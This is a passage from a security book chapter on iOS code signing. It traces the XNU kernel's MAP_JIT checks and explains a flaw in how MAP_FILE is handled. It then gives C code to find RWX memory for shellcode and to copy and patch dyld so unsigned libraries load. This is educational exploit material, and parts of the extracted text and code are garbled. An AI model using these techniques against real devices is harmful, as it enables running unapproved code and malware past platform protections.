#define MAP_FILE 0x0000
#define MAP_JIT 0x0800
/* Allocate a region that will be used for JIT purposes */
You’ve seen how the allocation occurs; now check out how the kernel handles
this special fl ag.
How the Kernel Handles JIT
mmap, which in XNU, is in the fi le bsd/kern/kern_mman.c, shown below, contains
a line that ensures that only the types of JIT allocations that MobileSafari make
are acceptable, namely PRIVATE | ANON mappings:
int
mmap(proc_t p, struct mmap_args *uap, user_addr_t *retval)
...
cc0044..iinndddd 9911 44//1166//22001122 55::4433::5511 PPMM
92 Chapter 4 n Code Signing and Memory Protections
if ((flags & MAP_JIT) && ((flags & MAP_FIXED) || (flags &
MAP_SHARED) || (flags & MAP_FILE))){
return EINVAL;
}
Sometime after that, a check is made for the proper entitlement:
...
if (flags & MAP_ANON) {
maxprot = VM_PROT_ALL;
#if CONFIG_MACF
error = mac_proc_check_map_anon(p, user_addr,
user_size, prot, flags, &maxprot);
if (error) {
return EINVAL;
}
...
The decompilation of this check is shown in Figure 4.9.
Figure 4.9: Decompilation of amfi_proc_check_map_anon
If you continue on with the mmap function, you arrive at where it processes
the fl ag:
...
if (flags & MAP_JIT){
alloc_flags |= VM_FLAGS_MAP_JIT;
}
...
result = vm_map_enter_mem_object_control(..., alloc_flags, ...);
This function is defi ned in osfmk/vm/vm_map.c:
...
kern_return_t
cc0044..iinndddd 9922 44//1166//22001122 55::4433::5511 PPMM
Chapter 4 n Code Signing and Memory Protections 93
vm_map_enter_mem_object_control(...int flags, ...
vm_prot_t cur_protection,...)
...
result = vm_map_enter(..., flags, ...cur_protection,...);
...
And, fi nally, inside vm_map_enter you’re back to the check you saw in the
previous section:
kern_return_t
vm_map_enter(...int flags, ... vm_prot_t cur_protection,...)
...
#if CONFIG_EMBEDDED
if (cur_protection & VM_PROT_WRITE){
if ((cur_protection & VM_PROT_EXECUTE) &&
!(flags & VM_FLAGS_MAP_JIT)){
printf(“EMBEDDED: %s curprot cannot be
write+execute. turning off execute\n”,
__PRETTY_FUNCTION__);
cur_protection &= ~VM_PROT_EXECUTE;
}
}
#endif /* CONFIG_EMBEDDED */
This is the check that shows you cannot have memory that is writable and
executable unless it also has the JIT fl ag set. So you can have an executable, writ-
able section, only if you reach this code with the JIT fl ag set.
You’ve seen the code that is responsible for allowing only processes with the
dynamic code signing entitlement to allocate writable and executable memory
by using a special fl ag to mmap. Now take a peek at the code responsible for not
allowing multiple uses of this fl ag. This prevents processes with this entitle-
ment, for example MobileSafari, from being attacked and allowing attackers to
call mmap with the MAP_JIT fl ag to allocate a new writable and executable region
for their shellcode.
Checking for only a single region is also performed in the vm_map_enter
function:
if ((flags & VM_FLAGS_MAP_JIT) && (map->jit_entry_exists)){
result = KERN_INVALID_ARGUMENT;
goto BailOut;
}
...
if (flags & VM_FLAGS_MAP_JIT){
if (!(map->jit_entry_exists)){
new_entry->used_for_jit = TRUE;
map->jit_entry_exists = TRUE;
}
}
cc0044..iinndddd 9933 44//1166//22001122 55::4433::5511 PPMM
94 Chapter 4 n Code Signing and Memory Protections
So, a fl ag in the virtual memory process map stores whether any region has
ever been mapped with the VM_FLAGS_MAP_JIT fl ag set. If this fl ag is already
set, the allocation fails if you try another such region. There is no way to clear
this fl ag, for example, by deallocating the region. Therefore, attackers wanting
to execute shellcode within MobileSafari cannot allocate their own memory
region, but rather must fi nd and reuse the existing allocated JIT region.
Attacking Inside MobileSafari
Writing complex ROP payloads is, well, complex. It would be much easier to
write a smaller ROP payload that would then execute shellcode. Before the
introduction of dynamic code signing, it was not possible to inject and execute
shellcode, and the entire payload had to be done using ROP. Now, if attackers
could fi nd the JIT area, they could write shellcode into the buffer and execute it.
Probably the simplest way to do this is to copy the actions of the following
small function within a ROP payload:
NOTE Code in this chapter is available on this book’s companion website at
www.wiley.com/go/ioshackershandbook.
unsigned int find_rwx(){
task_t task = mach_task_self();
mach_vm_address_t address = 1;
kern_return_t kret;
vm_region_basic_info_data_64_t info;
mach_vm_size_t size = 0;
mach_port_t object_name;
mach_msg_type_number_t count;
while((unsigned int) address != 0){
count = VM_REGION_BASIC_INFO_COUNT_64;
kret = mach_vm_region (task, &address, &size,
VM_REGION_BASIC_INFO_64,
(vm_region_info_t) &info,
&count, &object_name);
if(info.protection == 7)
return address;
address += size;
}
return 0;
}
This function looks through all allocated memory regions searching for one
that has protection 0x7, i.e. RWX (readable, writeable, and executable). This is
the address where the payload should write its machine code and jump to it.
cc0044..iinndddd 9944 44//1166//22001122 55::4433::5511 PPMM
Chapter 4 n Code Signing and Memory Protections 95
Breaking Code Signing
For other apps — ones that do not contain the dynamic code signing entitle-
ment — things are much harder. There is no generic way to do anything short of
a full ROP payload. However, at the time of the writing of this book, it is possible
for an application to create a region of writable and executable memory. This is
due to a fl aw in the way the kernel does the checking for the MAP_JIT fl ag in mmap.
This is a very serious bug because, besides allowing for an attacker to provide
shellcode payloads, it also allows apps from Apple’s App Store to run arbitrary
code that was not approved by Apple. The app that uses this trick would just
have to dynamically create a writable and executable region, download any code
it wished, write it into the buffer, and then execute it. This completely bypasses
the controls put in place by the App Store to prevent malware.
The bug is in the following line of code that was discussed earlier in this
chapter (did you catch it then?).
if ((flags & MAP_JIT) && ((flags & MAP_FIXED) ||
(flags & MAP_SHARED) || (flags & MAP_FILE))){
return EINVAL;
}
The problem is that MAP_FILE is defi ned to be zero. Therefore, the check for flags
& MAP_FILE is meaningless because it always results in a zero and therefore doesn’t
actually check anything. Looking at the disassembly shows this. (See Figure 4.10.)
Figure 4.10: Code that is supposed to enforce the JIT_FLAG is only set with the
MAP_ANON flag.
It checks for the JIT_FLAG, and then it checks for MAP_FIXED & MAP_SHARED.
That means that this check fails to prevent a call to mmap with the fl ags MAP_
JIT | MAP_PRIVATE | MAP_FILE set. Then later, for some reason, the check that
cc0044..iinndddd 9955 44//1166//22001122 55::4433::5511 PPMM
96 Chapter 4 n Code Signing and Memory Protections
verifi es the application has the proper entitlement and is performed only for
anonymous mappings, that is, for ones with the MAP_ANON fl ag set.
So any iOS process (which hasn’t previously created an RWX region) can
make the following call:
char *x = (char *) mmap(0, any_size, PROT_READ | PROT_WRITE |
PROT_EXEC, MAP_JIT | MAP_PRIVATE | MAP_FILE, some_valid_fd, 0);
And a readable, writable, and executable region of arbitrary size will be
returned to the process. Oops.
Altering iOS Shellcode
At this point an attacker who attacks an app knows he can either reuse an
existing JIT region (that is, if he is attacking MobileSafari), or he can create
one himself using ROP (if he is attacking other apps besides MobileSafari, or
in the case of AppStore Malware, which would take advantage of this fl aw).
He can then copy in shellcode and execute it. This shellcode can do whatever
the author wants, of course. But if writing ROP payloads is hard, writing large
shellcode payloads is easy, but annoying. It would be even better if you could
execute higher-level code written in C or even Objective C. It turns out that
once you have access to write shellcode, you’ve essentially broken the code
signing on the device, because it is not too hard to be able to load unsigned
libraries with it.
You could either write your own code linker or just try to reuse and abuse
the existing one. Here’s an example that uses the latter approach. The existing
dynamic linker, dyld, allocates space for a library, loads it, links it, and runs
it. You need to patch the dynamic linker to load the new code in the freshly
allocated RWX region where the laws of code signing don’t apply. You can’t
patch dyld in place, because it invalidates the dynamic code signature of that
page. Instead, patch it by making a copy of dyld in the RWX region and then
patching it there.
The fi rst thing you need to do is fi nd where dyld is loaded, which will vary
due to the address space layout randomization (ASLR). You have two possible
ways to accomplish this task. The fi rst would be to fi nd where the main is located.
Due to the way ASLR works, the difference between where the main executable
is currently located from where it would normally be located (0x1000) will be
the same offset that any symbol will be from where you would expect it to be.
So, in this case, dyld will be offset the same distance from where you would
expect it to be (0x2fe00000) as main is from 0x1000. So if you know the address
of any symbol in the main binary, you can calculate the location of dyld.
Another approach, and the one we show you here, is to use some information
from libdyld.dylib. It has a (non-exported) symbol called myDyldSection that
cc0044..iinndddd 9966 44//1166//22001122 55::4433::5511 PPMM
Chapter 4 n Code Signing and Memory Protections 97
it uses to locate, and then call functions from, dyld. It just so happens that the
fi rst dword at the address of myDyldSection is the location of dyld:
(gdb) x/x &myDyldSection
0x3e781000 : 0x2fe2a000
Because the symbol is not exported, it is necessary to fi nd some exported
symbol in any library (since they will all share the same ASLR offset) and
calculate the offset between myDyldSection and that symbol. This makes the
payload fi rmware version-dependent, unfortunately. The other thing to keep
in mind is that, though this is a bit complicated, the code is written in C (in the
case of an app wanting to load new unsigned code) or in shellcode (in the case
of an exploit). In either case, it is relatively easy to write code to do this. The C
code is shown here:
unsigned int *fgNextPIEDylibAddress_ptr;
unsigned int *ptr_to_fgNextPIEDylibAddress_ptr;
unsigned int next_mmap;
//
// hard coded values
//
unsigned int dyld_size = 227520;
unsigned int dyld_data_start = 0x26000;
unsigned int dyld_data_end = 0x26e48;
unsigned int libdyld_data_size = 0x12b;
unsigned int diff_to_myDyldSection = 0xbbc5008;
// find dyld
unsigned int myexit = (unsigned int) &exit;
my_myDyldSection = myexit + diff_from_exit_to_myDyldSection;
unsigned int dyld_loc = * (unsigned int *) myDyldSection;
dyld_loc -= 0x1000;
Next up, you allocate the RWX region (or just fi nd where one exists). foo is
the name of a large fi le to map from:
int fd = open(“foo”, O_RDWR);
char *x = (char *) mmap(0, 0x1000000, PROT_READ | PROT_WRITE |
PROT_EXEC /*0*/, MAP_JIT | MAP_PRIVATE |
MAP_FILE, fd, 0);
next_mmap is the next spot in the RWX buffer after dyld, which the next bit
of code is about to copy. next_mmap is where you want the patched dyld to load
the next library:
memcpy(x, (unsigned char *) dyld_loc, dyld_size);
next_mmap = (unsigned int) x + dyld_size;
cc0044..iinndddd 9977 44//1166//22001122 55::4433::5511 PPMM
98 Chapter 4 n Code Signing and Memory Protections
You now have an executable copy of dyld that you can modify. In addition
to the patches you want to impose on it, some other fi xups are necessary. dyld
contains many function pointers in its data section that point to itself. That
means if you call a function in your copy of dyld, it may call a function pointer
stored there and end up executing code in the original (unpatched) dyld. To
prevent this, you loop through and change any function pointers found in the
data section of the copy of dyld to point to the copy of dyld:
// change data to point to new guy:
unsigned int *data_ptr = (unsigned int *) (x + dyld_data_start);
while(data_ptr = dyld_loc) && (*data_ptr = dyld_loc) && (*data_ptr < dyld_loc +
dyld_size)){
unsigned int newer = (unsigned int) x +
(*data_ptr - dyld_loc);
*data_ptr = newer;
}
data_ptr++;
}
With those fi xes, the new copy of dyld should work. Now you just need to
patch it to load libraries into the RWX region you created, and they should be
executable, even though they aren’t signed. This requires four small patches.
The fi rst patch involves fgNextPIEDylibAddress_ptr. This pointer points to a
spot in dyld where it stores where the next library will be loaded. You want to
set it to your variable next_mmap:
cc0044..iinndddd 9988 44//1166//22001122 55::4433::5511 PPMM
Chapter 4 n Code Signing and Memory Protections 99
//
// patch 1: set ptr_to_fgNextPIEDylibAddress and